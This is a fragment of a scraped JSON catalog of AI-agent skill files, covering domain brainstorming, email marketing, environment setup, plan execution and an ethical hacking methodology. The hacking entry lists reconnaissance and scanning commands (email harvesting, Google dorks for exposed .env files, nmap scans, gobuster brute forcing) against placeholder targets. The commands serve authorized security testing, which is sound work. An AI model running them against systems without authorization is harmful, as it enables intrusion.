      "content": "\n# Domain Name Brainstormer\n\nThis skill helps you find the perfect domain name for your project by generating creative options and checking what's actually available to register.\n\n## When to Use This Skill\n\n- Starting a new project or company\n- Launching a product or service\n- Creating a personal brand or portfolio site\n- Rebranding an existing project\n- Registering a domain for a side project\n- Finding available alternatives when your first choice is taken\n\n## What This Skill Does\n\n1. **Understands Your Project**: Analyzes what you're building and who it's for\n2. **Generates Creative Names**: Creates relevant, memorable domain options\n3. **Checks Availability**: Verifies which domains are actually available across multiple TLDs\n4. **Multiple Extensions**: Suggests .com, .io, .dev, .ai, .app, and more\n5. **Provides Alternatives**: Offers variations if top choices are taken\n6. **Branding Insights**: Explains why certain names work well\n\n## How to Use\n\n### Basic Brainstorming\n\n```\nI'm building a project management tool for remote teams. \nSuggest domain names.\n```\n\n```\nHelp me brainstorm domain names for a personal finance app\n```\n\n### Specific Preferences\n\n```\nI need a domain name for my AI writing assistant. \nPrefer short names with .ai or .io extension.\n```\n\n### With Keywords\n\n```\nSuggest domain names using the words \"pixel\" or \"studio\" \nfor my design agency\n```\n\n## Example\n\n**User**: \"I'm building a tool for developers to share code snippets. Suggest creative domain names.\"\n\n**Output**:\n```\nAnalyzing your project...\nTarget audience: Developers\nKey features: Code sharing, snippets, collaboration\n\n🎯 Domain Name Suggestions\n\n## Available (.com)\n1. ✓ snippetbox.com - Clear, memorable, available!\n   Why: Directly describes the product, easy to remember\n\n2. ✓ codeclip.com - Short and snappy\n   Why: Implies quick code sharing, only 8 characters\n\n3. ✓ devpaste.com - Developer-focused\n   Why: Familiar to devs (like pastebin), clear purpose\n\n## Available (Alternative TLDs)\n4. ✓ snippet.dev - Perfect extension for developers\n   Why: .dev extension signals developer tool\n\n5. ✓ codebox.io - Tech-forward\n   Why: .io popular with tech startups, clean name\n\n6. ✓ sharecode.app - Descriptive\n   Why: .app extension, clearly states the action\n\n## Premium/Taken (.com)\n- codeshare.com (Taken, est. $2,500)\n- snippets.com (Taken, premium domain)\n\n## Recommendations\n\n🏆 Top Pick: snippet.dev\n- Perfect for developer audience\n- Short and memorable  \n- .dev extension adds credibility\n- Available now!\n\n🥈 Runner-up: snippetbox.com\n- .com is universally recognized\n- Slightly longer but descriptive\n- Great brandability\n\nNext steps:\n1. Register your favorite before someone else does!\n2. Want me to check more variations?\n3. Need help with logo ideas for these names?\n```\n\n**Inspired by:** Ben Aiad's use case from Lenny's Newsletter\n\n## Domain Naming Tips\n\n### What Makes a Good Domain\n\n✓ **Short**: Under 15 characters ideal\n✓ **Memorable**: Easy to recall and spell\n✓ **Pronounceable**: Can be said in conversation\n✓ **Descriptive**: Hints at what you do\n✓ **Brandable**: Unique enough to stand out\n✓ **No hyphens**: Easier to share verbally\n\n### TLD Guide\n\n- **.com**: Universal, trusted, great for businesses\n- **.io**: Tech startups, developer tools\n- **.dev**: Developer-focused products\n- **.ai**: AI/ML products\n- **.app**: Mobile or web applications\n- **.co**: Alternative to .com\n- **.xyz**: Modern, creative projects\n- **.design**: Creative/design agencies\n- **.tech**: Technology companies\n\n## Advanced Features\n\n### Check Similar Variations\n\n```\nCheck availability for \"codebase\" and similar variations \nacross .com, .io, .dev\n```\n\n### Industry-Specific\n\n```\nSuggest domain names for a sustainable fashion brand, \nchecking .eco and .fashion TLDs\n```\n\n### Multilingual Options\n\n```\nBrainstorm domain names in English and Spanish for \na language learning app\n```\n\n### Competitor Analysis\n\n```\nShow me domain patterns used by successful project \nmanagement tools, then suggest similar available ones\n```\n\n## Example Workflows\n\n### Startup Launch\n1. Describe your startup idea\n2. Get 10-15 domain suggestions across TLDs\n3. Review availability and pricing\n4. Pick top 3 favorites\n5. Register immediately\n\n### Personal Brand\n1. Share your name and profession\n2. Get variations (firstname.com, firstnamelastname.dev, etc.)\n3. Check social media handle availability too\n4. Register consistent brand across platforms\n\n### Product Naming\n1. Describe product and target market\n2. Get creative, brandable names\n3. Check trademark conflicts\n4. Verify domain and social availability\n5. Test names with target audience\n\n## Tips for Success\n\n1. **Act Fast**: Good domains get taken quickly\n2. **Register Variations**: Get .com and .io to protect brand\n3. **Avoid Numbers**: Hard to communicate verbally\n4. **Check Social Media**: Make sure @username is available too\n5. **Say It Out Loud**: Test if it's easy to pronounce\n6. **Check Trademarks**: Ensure no legal conflicts\n7. **Think",
      "tags": [
        "ai",
        "workflow",
        "design",
        "domain",
        "name",
        "brainstormer"
      ],
      "useCases": [
        "Starting a new project or company",
        "Launching a product or service",
        "Creating a personal brand or portfolio site",
        "Rebranding an existing project",
        "Registering a domain for a side project"
      ],
      "scrapedAt": "2026-01-26T13:15:46.670Z"
    },
    {
      "id": "antigravity-email-sequence",
      "name": "email-sequence",
      "slug": "email-sequence",
      "description": "When the user wants to create or optimize an email sequence, drip campaign, automated email flow, or lifecycle email program. Also use when the user mentions \"email sequence,\" \"drip campaign,\" \"nurture sequence,\" \"onboarding emails,\" \"welcome sequence,\" \"re-engagement emails,\" \"email automation,\" or",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/email-sequence",
      "content": "\n# Email Sequence Design\n\nYou are an expert in email marketing and automation. Your goal is to create email sequences that nurture relationships, drive action, and move people toward conversion.\n\n## Initial Assessment\n\nBefore creating a sequence, understand:\n\n1. **Sequence Type**\n   - Welcome/onboarding sequence\n   - Lead nurture sequence\n   - Re-engagement sequence\n   - Post-purchase sequence\n   - Event-based sequence\n   - Educational sequence\n   - Sales sequence\n\n2. **Audience Context**\n   - Who are they?\n   - What triggered them into this sequence?\n   - What do they already know/believe?\n   - What's their current relationship with you?\n\n3. **Goals**\n   - Primary conversion goal\n   - Relationship-building goals\n   - Segmentation goals\n   - What defines success?\n\n---\n\n## Core Principles\n\n### 1. One Email, One Job\n- Each email has one primary purpose\n- One main CTA per email\n- Don't try to do everything\n\n### 2. Value Before Ask\n- Lead with usefulness\n- Build trust through content\n- Earn the right to sell\n\n### 3. Relevance Over Volume\n- Fewer, better emails win\n- Segment for relevance\n- Quality > frequency\n\n### 4. Clear Path Forward\n- Every email moves them somewhere\n- Links should do something useful\n- Make next steps obvious\n\n---\n\n## Email Sequence Strategy\n\n### Sequence Length\n- Welcome: 3-7 emails\n- Lead nurture: 5-10 emails\n- Onboarding: 5-10 emails\n- Re-engagement: 3-5 emails\n\nDepends on:\n- Sales cycle length\n- Product complexity\n- Relationship stage\n\n### Timing/Delays\n- Welcome email: Immediately\n- Early sequence: 1-2 days apart\n- Nurture: 2-4 days apart\n- Long-term: Weekly or bi-weekly\n\nConsider:\n- B2B: Avoid weekends\n- B2C: Test weekends\n- Time zones: Send at local time\n\n### Subject Line Strategy\n- Clear > Clever\n- Specific > Vague\n- Benefit or curiosity-driven\n- 40-60 characters ideal\n- Test emoji (they're polarizing)\n\n**Patterns that work:**\n- Question: \"Still struggling with X?\"\n- How-to: \"How to [achieve outcome] in [timeframe]\"\n- Number: \"3 ways to [benefit]\"\n- Direct: \"[First name], your [thing] is ready\"\n- Story tease: \"The mistake I made with [topic]\"\n\n### Preview Text\n- Extends the subject line\n- ~90-140 characters\n- Don't repeat subject line\n- Complete the thought or add intrigue\n\n---\n\n## Sequence Templates\n\n### Welcome Sequence (Post-Signup)\n\n**Email 1: Welcome (Immediate)**\n- Subject: Welcome to [Product] — here's your first step\n- Deliver what was promised (lead magnet, access, etc.)\n- Single next action\n- Set expectations for future emails\n\n**Email 2: Quick Win (Day 1-2)**\n- Subject: Get your first [result] in 10 minutes\n- Enable small success\n- Build confidence\n- Link to helpful resource\n\n**Email 3: Story/Why (Day 3-4)**\n- Subject: Why we built [Product]\n- Origin story or mission\n- Connect emotionally\n- Show you understand their problem\n\n**Email 4: Social Proof (Day 5-6)**\n- Subject: How [Customer] achieved [Result]\n- Case study or testimonial\n- Relatable to their situation\n- Soft CTA to explore\n\n**Email 5: Overcome Objection (Day 7-8)**\n- Subject: \"I don't have time for X\" — sound familiar?\n- Address common hesitation\n- Reframe the obstacle\n- Show easy path forward\n\n**Email 6: Core Feature (Day 9-11)**\n- Subject: Have you tried [Feature] yet?\n- Highlight underused capability\n- Show clear benefit\n- Direct CTA to try it\n\n**Email 7: Conversion (Day 12-14)**\n- Subject: Ready to [upgrade/buy/commit]?\n- Summarize value\n- Clear offer\n- Urgency if appropriate\n- Risk reversal (guarantee, trial)\n\n---\n\n### Lead Nurture Sequence (Pre-Sale)\n\n**Email 1: Deliver + Introduce (Immediate)**\n- Deliver the lead magnet\n- Brief intro to who you are\n- Preview what's coming\n\n**Email 2: Expand on Topic (Day 2-3)**\n- Related insight to lead magnet\n- Establish expertise\n- Light CTA to content\n\n**Email 3: Problem Deep-Dive (Day 4-5)**\n- Articulate their problem deeply\n- Show you understand\n- Hint at solution\n\n**Email 4: Solution Framework (Day 6-8)**\n- Your approach/methodology\n- Educational, not salesy\n- Builds toward your product\n\n**Email 5: Case Study (Day 9-11)**\n- Real results from real customer\n- Specific and relatable\n- Soft CTA\n\n**Email 6: Differentiation (Day 12-14)**\n- Why your approach is different\n- Address alternatives\n- Build preference\n\n**Email 7: Objection Handler (Day 15-18)**\n- Common concern addressed\n- FAQ or myth-busting\n- Reduce friction\n\n**Email 8: Direct Offer (Day 19-21)**\n- Clear pitch\n- Strong value proposition\n- Specific CTA\n- Urgency if available\n\n---\n\n### Re-Engagement Sequence\n\n**Email 1: Check-In (Day 30-60 of inactivity)**\n- Subject: Is everything okay, [Name]?\n- Genuine concern\n- Ask what happened\n- Easy win to re-engage\n\n**Email 2: Value Reminder (Day 2-3 after)**\n- Subject: Remember when you [achieved X]?\n- Remind of past value\n- What's new since they left\n- Quick CTA\n\n**Email 3: Incentive (Day 5-7 after)**\n- Subject: We miss you — here's something special\n- Offer if appropriate\n- Limited time\n- Clear CTA\n\n**Email 4: Last Chance (Day 10-14 after)**\n- Subject: Should we stop e",
      "tags": [
        "ai",
        "automation",
        "template",
        "design",
        "document",
        "rag",
        "cro",
        "marketing",
        "copywriting"
      ],
      "useCases": [
        "Action-based sends",
        "More relevant than time-based",
        "Examples: Feature used, milestone hit, inactivity"
      ],
      "scrapedAt": "2026-01-26T13:18:13.196Z"
    },
    {
      "id": "antigravity-email-systems",
      "name": "email-systems",
      "slug": "email-systems",
      "description": "Email has the highest ROI of any marketing channel. $36 for every $1 spent. Yet most startups treat it as an afterthought - bulk blasts, no personalization, landing in spam folders.  This skill covers transactional email that works, marketing automation that converts, deliverability that reaches inb",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/email-systems",
      "content": "\n# Email Systems\n\nYou are an email systems engineer who has maintained 99.9% deliverability\nacross millions of emails. You've debugged SPF/DKIM/DMARC, dealt with\nblacklists, and optimized for inbox placement. You know that email is the\nhighest ROI channel when done right, and a spam folder nightmare when done\nwrong. You treat deliverability as infrastructure, not an afterthought.\n\n## Patterns\n\n### Transactional Email Queue\n\nQueue all transactional emails with retry logic and monitoring\n\n### Email Event Tracking\n\nTrack delivery, opens, clicks, bounces, and complaints\n\n### Template Versioning\n\nVersion email templates for rollback and A/B testing\n\n## Anti-Patterns\n\n### ❌ HTML email soup\n\n**Why bad**: Email clients render differently. Outlook breaks everything.\n\n### ❌ No plain text fallback\n\n**Why bad**: Some clients strip HTML. Accessibility issues. Spam signal.\n\n### ❌ Huge image emails\n\n**Why bad**: Images blocked by default. Spam trigger. Slow loading.\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Missing SPF, DKIM, or DMARC records | critical | # Required DNS records: |\n| Using shared IP for transactional email | high | # Transactional email strategy: |\n| Not processing bounce notifications | high | # Bounce handling requirements: |\n| Missing or hidden unsubscribe link | critical | # Unsubscribe requirements: |\n| Sending HTML without plain text alternative | medium | # Always send multipart: |\n| Sending high volume from new IP immediately | high | # IP warm-up schedule: |\n| Emailing people who did not opt in | critical | # Permission requirements: |\n| Emails that are mostly or entirely images | medium | # Balance images and text: |\n",
      "tags": [
        "ai",
        "automation",
        "template",
        "image",
        "cro",
        "marketing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:14.411Z"
    },
    {
      "id": "antigravity-environment-setup-guide",
      "name": "environment-setup-guide",
      "slug": "environment-setup-guide",
      "description": "Guide developers through setting up development environments with proper tools, dependencies, and configurations",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/environment-setup-guide",
      "content": "\n# Environment Setup Guide\n\n## Overview\n\nHelp developers set up complete development environments from scratch. This skill provides step-by-step guidance for installing tools, configuring dependencies, setting up environment variables, and verifying the setup works correctly.\n\n## When to Use This Skill\n\n- Use when starting a new project and need to set up the development environment\n- Use when onboarding new team members to a project\n- Use when switching to a new machine or operating system\n- Use when troubleshooting environment-related issues\n- Use when documenting setup instructions for a project\n- Use when creating development environment documentation\n\n## How It Works\n\n### Step 1: Identify Requirements\n\nI'll help you determine what needs to be installed:\n- Programming language and version (Node.js, Python, Go, etc.)\n- Package managers (npm, pip, cargo, etc.)\n- Database systems (PostgreSQL, MongoDB, Redis, etc.)\n- Development tools (Git, Docker, IDE extensions, etc.)\n- Environment variables and configuration files\n\n### Step 2: Check Current Setup\n\nBefore installing anything, I'll help you check what's already installed:\n```bash\n# Check versions of installed tools\nnode --version\npython --version\ngit --version\ndocker --version\n```\n\n### Step 3: Provide Installation Instructions\n\nI'll give platform-specific installation commands:\n- **macOS:** Using Homebrew\n- **Linux:** Using apt, yum, or package manager\n- **Windows:** Using Chocolatey, Scoop, or direct installers\n\n### Step 4: Configure the Environment\n\nHelp set up:\n- Environment variables (.env files)\n- Configuration files (.gitconfig, .npmrc, etc.)\n- IDE settings (VS Code, IntelliJ, etc.)\n- Shell configuration (.bashrc, .zshrc, etc.)\n\n### Step 5: Verify Installation\n\nProvide verification steps to ensure everything works:\n- Run version checks\n- Test basic commands\n- Verify database connections\n- Check environment variables are loaded\n\n## Examples\n\n### Example 1: Node.js Project Setup\n\n```markdown\n## Setting Up Node.js Development Environment\n\n### Prerequisites\n- macOS, Linux, or Windows\n- Terminal/Command Prompt access\n- Internet connection\n\n### Step 1: Install Node.js\n\n**macOS (using Homebrew):**\n\\`\\`\\`bash\n# Install Homebrew if not installed\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n\n# Install Node.js\nbrew install node\n\\`\\`\\`\n\n**Linux (Ubuntu/Debian):**\n\\`\\`\\`bash\n# Update package list\nsudo apt update\n\n# Install Node.js and npm\ncurl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -\nsudo apt install -y nodejs\n\\`\\`\\`\n\n**Windows (using Chocolatey):**\n\\`\\`\\`powershell\n# Install Chocolatey if not installed\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\n\n# Install Node.js\nchoco install nodejs\n\\`\\`\\`\n\n### Step 2: Verify Installation\n\n\\`\\`\\`bash\nnode --version  # Should show v20.x.x or higher\nnpm --version   # Should show 10.x.x or higher\n\\`\\`\\`\n\n### Step 3: Install Project Dependencies\n\n\\`\\`\\`bash\n# Clone the repository\ngit clone https://github.com/your-repo/project.git\ncd project\n\n# Install dependencies\nnpm install\n\\`\\`\\`\n\n### Step 4: Set Up Environment Variables\n\nCreate a \\`.env\\` file:\n\\`\\`\\`bash\n# Copy example environment file\ncp .env.example .env\n\n# Edit with your values\nnano .env\n\\`\\`\\`\n\nExample \\`.env\\` content:\n\\`\\`\\`\nNODE_ENV=development\nPORT=3000\nDATABASE_URL=postgresql://localhost:5432/mydb\nAPI_KEY=your-api-key-here\n\\`\\`\\`\n\n### Step 5: Run the Project\n\n\\`\\`\\`bash\n# Start development server\nnpm run dev\n\n# Should see: Server running on http://localhost:3000\n\\`\\`\\`\n\n### Troubleshooting\n\n**Problem:** \"node: command not found\"\n**Solution:** Restart your terminal or run \\`source ~/.bashrc\\` (Linux) or \\`source ~/.zshrc\\` (macOS)\n\n**Problem:** \"Permission denied\" errors\n**Solution:** Don't use sudo with npm. Fix permissions:\n\\`\\`\\`bash\nmkdir ~/.npm-global\nnpm config set prefix '~/.npm-global'\necho 'export PATH=~/.npm-global/bin:$PATH' >> ~/.bashrc\nsource ~/.bashrc\n\\`\\`\\`\n```\n\n### Example 2: Python Project Setup\n\n```markdown\n## Setting Up Python Development Environment\n\n### Step 1: Install Python\n\n**macOS:**\n\\`\\`\\`bash\nbrew install python@3.11\n\\`\\`\\`\n\n**Linux:**\n\\`\\`\\`bash\nsudo apt update\nsudo apt install python3.11 python3.11-venv python3-pip\n\\`\\`\\`\n\n**Windows:**\n\\`\\`\\`powershell\nchoco install python --version=3.11\n\\`\\`\\`\n\n### Step 2: Verify Installation\n\n\\`\\`\\`bash\npython3 --version  # Should show Python 3.11.x\npip3 --version     # Should show pip 23.x.x\n\\`\\`\\`\n\n### Step 3: Create Virtual Environment\n\n\\`\\`\\`bash\n# Navigate to project directory\ncd my-project\n\n# Create virtual environment\npython3 -m venv venv\n\n# Activate virtual environment\n# macOS/Linux:\nsource venv/bin/activate\n\n# Windows:\nvenv\\Scripts\\activate\n\\`\\`\\`\n\n### Step 4: Install Dependencies\n\n\\`\\`\\`bash\n# Install fro",
      "tags": [
        "python",
        "node",
        "markdown",
        "api",
        "ai",
        "template",
        "document",
        "image",
        "security",
        "docker"
      ],
      "useCases": [
        "Use when starting a new project and need to set up the development environment",
        "Use when onboarding new team members to a project",
        "Use when switching to a new machine or operating system",
        "Use when troubleshooting environment-related issues",
        "Use when documenting setup instructions for a project"
      ],
      "scrapedAt": "2026-01-26T13:18:15.817Z"
    },
    {
      "id": "antigravity-ethical-hacking-methodology",
      "name": "Ethical Hacking Methodology",
      "slug": "ethical-hacking-methodology",
      "description": "This skill should be used when the user asks to \"learn ethical hacking\", \"understand penetration testing lifecycle\", \"perform reconnaissance\", \"conduct security scanning\", \"exploit vulnerabilities\", or \"write penetration test reports\". It provides comprehensive ethical hacking methodology and techni",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/ethical-hacking-methodology",
      "content": "\n# Ethical Hacking Methodology\n\n## Purpose\n\nMaster the complete penetration testing lifecycle from reconnaissance through reporting. This skill covers the five stages of ethical hacking methodology, essential tools, attack techniques, and professional reporting for authorized security assessments.\n\n## Prerequisites\n\n### Required Environment\n- Kali Linux installed (persistent or live)\n- Network access to authorized targets\n- Written authorization from system owner\n\n### Required Knowledge\n- Basic networking concepts\n- Linux command-line proficiency\n- Understanding of web technologies\n- Familiarity with security concepts\n\n## Outputs and Deliverables\n\n1. **Reconnaissance Report** - Target information gathered\n2. **Vulnerability Assessment** - Identified weaknesses\n3. **Exploitation Evidence** - Proof of concept attacks\n4. **Final Report** - Executive and technical findings\n\n## Core Workflow\n\n### Phase 1: Understanding Hacker Types\n\nClassification of security professionals:\n\n**White Hat Hackers (Ethical Hackers)**\n- Authorized security professionals\n- Conduct penetration testing with permission\n- Goal: Identify and fix vulnerabilities\n- Also known as: penetration testers, security consultants\n\n**Black Hat Hackers (Malicious)**\n- Unauthorized system intrusions\n- Motivated by profit, revenge, or notoriety\n- Goal: Steal data, cause damage\n- Also known as: crackers, criminal hackers\n\n**Grey Hat Hackers (Hybrid)**\n- May cross ethical boundaries\n- Not malicious but may break rules\n- Often disclose vulnerabilities publicly\n- Mixed motivations\n\n**Other Classifications**\n- **Script Kiddies**: Use pre-made tools without understanding\n- **Hacktivists**: Politically or socially motivated\n- **Nation State**: Government-sponsored operatives\n- **Coders**: Develop tools and exploits\n\n### Phase 2: Reconnaissance\n\nGather information without direct system interaction:\n\n**Passive Reconnaissance**\n```bash\n# WHOIS lookup\nwhois target.com\n\n# DNS enumeration\nnslookup target.com\ndig target.com ANY\ndig target.com MX\ndig target.com NS\n\n# Subdomain discovery\ndnsrecon -d target.com\n\n# Email harvesting\ntheHarvester -d target.com -b all\n```\n\n**Google Hacking (OSINT)**\n```\n# Find exposed files\nsite:target.com filetype:pdf\nsite:target.com filetype:xls\nsite:target.com filetype:doc\n\n# Find login pages\nsite:target.com inurl:login\nsite:target.com inurl:admin\n\n# Find directory listings\nsite:target.com intitle:\"index of\"\n\n# Find configuration files\nsite:target.com filetype:config\nsite:target.com filetype:env\n```\n\n**Google Hacking Database Categories:**\n- Files containing passwords\n- Sensitive directories\n- Web server detection\n- Vulnerable servers\n- Error messages\n- Login portals\n\n**Social Media Reconnaissance**\n- LinkedIn: Organizational charts, technologies used\n- Twitter: Company announcements, employee info\n- Facebook: Personal information, relationships\n- Job postings: Technology stack revelations\n\n### Phase 3: Scanning\n\nActive enumeration of target systems:\n\n**Host Discovery**\n```bash\n# Ping sweep\nnmap -sn 192.168.1.0/24\n\n# ARP scan (local network)\narp-scan -l\n\n# Discover live hosts\nnmap -sP 192.168.1.0/24\n```\n\n**Port Scanning**\n```bash\n# TCP SYN scan (stealth)\nnmap -sS target.com\n\n# Full TCP connect scan\nnmap -sT target.com\n\n# UDP scan\nnmap -sU target.com\n\n# All ports scan\nnmap -p- target.com\n\n# Top 1000 ports with service detection\nnmap -sV target.com\n\n# Aggressive scan (OS, version, scripts)\nnmap -A target.com\n```\n\n**Service Enumeration**\n```bash\n# Specific service scripts\nnmap --script=http-enum target.com\nnmap --script=smb-enum-shares target.com\nnmap --script=ftp-anon target.com\n\n# Vulnerability scanning\nnmap --script=vuln target.com\n```\n\n**Common Port Reference**\n| Port | Service | Notes |\n|------|---------|-------|\n| 21 | FTP | File transfer |\n| 22 | SSH | Secure shell |\n| 23 | Telnet | Unencrypted remote |\n| 25 | SMTP | Email |\n| 53 | DNS | Name resolution |\n| 80 | HTTP | Web |\n| 443 | HTTPS | Secure web |\n| 445 | SMB | Windows shares |\n| 3306 | MySQL | Database |\n| 3389 | RDP | Remote desktop |\n\n### Phase 4: Vulnerability Analysis\n\nIdentify exploitable weaknesses:\n\n**Automated Scanning**\n```bash\n# Nikto web scanner\nnikto -h http://target.com\n\n# OpenVAS (command line)\nomp -u admin -w password --xml=\"<get_tasks/>\"\n\n# Nessus (via API)\nnessuscli scan --target target.com\n```\n\n**Web Application Testing (OWASP)**\n- SQL Injection\n- Cross-Site Scripting (XSS)\n- Broken Authentication\n- Security Misconfiguration\n- Sensitive Data Exposure\n- XML External Entities (XXE)\n- Broken Access Control\n- Insecure Deserialization\n- Using Components with Known Vulnerabilities\n- Insufficient Logging & Monitoring\n\n**Manual Techniques**\n```bash\n# Directory brute forcing\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n\n# Subdomain enumeration\ngobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt\n\n# Web technology fingerprinting\nwhatweb target.com\n```\n\n### Phase 5: Exploitation\n\nActively exploit discovered vulnerabilities:\n\n**M",
      "tags": [
        "pdf",
        "api",
        "ai",
        "workflow",
        "template",
        "document",
        "security",
        "hacking",
        "vulnerability",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:17.026Z"
    },
    {
      "id": "antigravity-exa-search",
      "name": "exa-search",
      "slug": "exa-search",
      "description": "Semantic search, similar content discovery, and structured research using Exa API",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/exa-search",
      "content": "\n# exa-search\n\n## Overview\nSemantic search, similar content discovery, and structured research using Exa API\n\n## When to Use\n- When you need semantic/embeddings-based search\n- When finding similar content\n- When searching by category (company, people, research papers, etc.)\n\n## Installation\n```bash\nnpx skills add -g BenedictKing/exa-search\n```\n\n## Step-by-Step Guide\n1. Install the skill using the command above\n2. Configure Exa API key\n3. Use naturally in Claude Code conversations\n\n## Examples\nSee [GitHub Repository](https://github.com/BenedictKing/exa-search) for examples.\n\n## Best Practices\n- Configure API keys via environment variables\n\n## Troubleshooting\nSee the GitHub repository for troubleshooting guides.\n\n## Related Skills\n- context7-auto-research, tavily-web, firecrawl-scraper, codex-review\n",
      "tags": [
        "api",
        "claude"
      ],
      "useCases": [
        "When you need semantic/embeddings-based search",
        "When finding similar content",
        "When searching by category (company, people, research papers, etc.)"
      ],
      "scrapedAt": "2026-01-26T13:18:18.196Z"
    },
    {
      "id": "superpowers-executing-plans",
      "name": "executing-plans",
      "slug": "superpowers-executing-plans",
      "description": "Use when you have a written implementation plan to execute in a separate session with review checkpoints",
      "category": "Collaboration & Project Management",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/executing-plans",
      "content": "\n# Executing Plans\n\n## Overview\n\nLoad plan, review critically, execute tasks in batches, report for review between batches.\n\n**Core principle:** Batch execution with checkpoints for architect review.\n\n**Announce at start:** \"I'm using the executing-plans skill to implement this plan.\"\n\n## The Process\n\n### Step 1: Load and Review Plan\n1. Read plan file\n2. Review critically - identify any questions or concerns about the plan\n3. If concerns: Raise them with your human partner before starting\n4. If no concerns: Create TodoWrite and proceed\n\n### Step 2: Execute Batch\n**Default: First 3 tasks**\n\nFor each task:\n1. Mark as in_progress\n2. Follow each step exactly (plan has bite-sized steps)\n3. Run verifications as specified\n4. Mark as completed\n\n### Step 3: Report\nWhen batch complete:\n- Show what was implemented\n- Show verification output\n- Say: \"Ready for feedback.\"\n\n### Step 4: Continue\nBased on feedback:\n- Apply changes if needed\n- Execute next batch\n- Repeat until complete\n\n### Step 5: Complete Development\n\nAfter all tasks complete and verified:\n- Announce: \"I'm using the finishing-a-development-branch skill to complete this work.\"\n- **REQUIRED SUB-SKILL:** Use superpowers:finishing-a-development-branch\n- Follow that skill to verify tests, present options, execute choice\n\n## When to Stop and Ask for Help\n\n**STOP executing immediately when:**\n- Hit a blocker mid-batch (missing dependency, test fails, instruction unclear)\n- Plan has critical gaps preventing starting\n- You don't understand an instruction\n- Verification fails repeatedly\n\n**Ask for clarification rather than guessing.**\n\n## When to Revisit Earlier Steps\n\n**Return to Review (Step 1) when:**\n- Partner updates the plan based on your feedback\n- Fundamental approach needs rethinking\n\n**Don't force through blockers** - stop and ask.\n\n## Remember\n- Review plan critically first\n- Follow plan steps exactly\n- Don't skip verifications\n- Reference skills when plan says to\n- Between batches: just report and wait\n- Stop when blocked, don't guess\n",
      "tags": [
        "verification",
        "executing",
        "plans"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:13.070Z"
    },
    {
      "id": "antigravity-executing-plans",
      "name": "executing-plans",
      "slug": "executing-plans",
      "description": "Use when you have a written implementation plan to execute in a separate session with review checkpoints",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/executing-plans",
      "content": "\n# Executing Plans\n\n## Overview\n\nLoad plan, review critically, execute tasks in batches, report for review between batches.\n\n**Core principle:** Batch execution with checkpoints for architect review.\n\n**Announce at start:** \"I'm using the executing-plans skill to implement this plan.\"\n\n## The Process\n\n### Step 1: Load and Review Plan\n1. Read plan file\n2. Review critically - identify any questions or concerns about the plan\n3. If concerns: Raise them with your human partner before starting\n4. If no concerns: Create TodoWrite and proceed\n\n### Step 2: Execute Batch\n**Default: First 3 tasks**\n\nFor each task:\n1. Mark as in_progress\n2. Follow each step exactly (plan has bite-sized steps)\n3. Run verifications as specified\n4. Mark as completed\n\n### Step 3: Report\nWhen batch complete:\n- Show what was implemented\n- Show verification output\n- Say: \"Ready for feedback.\"\n\n### Step 4: Continue\nBased on feedback:\n- Apply changes if needed\n- Execute next batch\n- Repeat until complete\n\n### Step 5: Complete Development\n\nAfter all tasks complete and verified:\n- Announce: \"I'm using the finishing-a-development-branch skill to complete this work.\"\n- **REQUIRED SUB-SKILL:** Use superpowers:finishing-a-development-branch\n- Follow that skill to verify tests, present options, execute choice\n\n## When to Stop and Ask for Help\n\n**STOP executing immediately when:**\n- Hit a blocker mid-batch (missing dependency, test fails, instruction unclear)\n- Plan has critical gaps preventing starting\n- You don't understand an instruction\n- Verification fails repeatedly\n\n**Ask for clarification rather than guessing.**\n\n## When to Revisit Earlier Steps\n\n**Return to Review (Step 1) when:**\n- Partner updates the plan based on your feedback\n- Fundamental approach needs rethinking\n\n**Don't force through blockers** - stop and ask.\n\n## Remember\n- Review plan critically first\n- Follow plan steps exactly\n- Don't skip verifications\n- Reference skills when plan says to\n- Between batches: just report and wait\n- Stop when blocked, don't guess\n",
      "tags": [
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:19.485Z"
    },
    {
      "id": "antigravity-file-path-traversal",
      "name": "File Path Traversal Testing",
      "slug": "file-path-traversal",
      "description": "This skill should be used when the user asks to \"test for directory traversal\", \"exploit path traversal vulnerabilities\", \"read arbitrary files through web applications\", \"find LFI vulnerabilities\", or \"access files outside web root\". It provides comprehensive file path traversal attack and testing ",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/file-path-traversal",
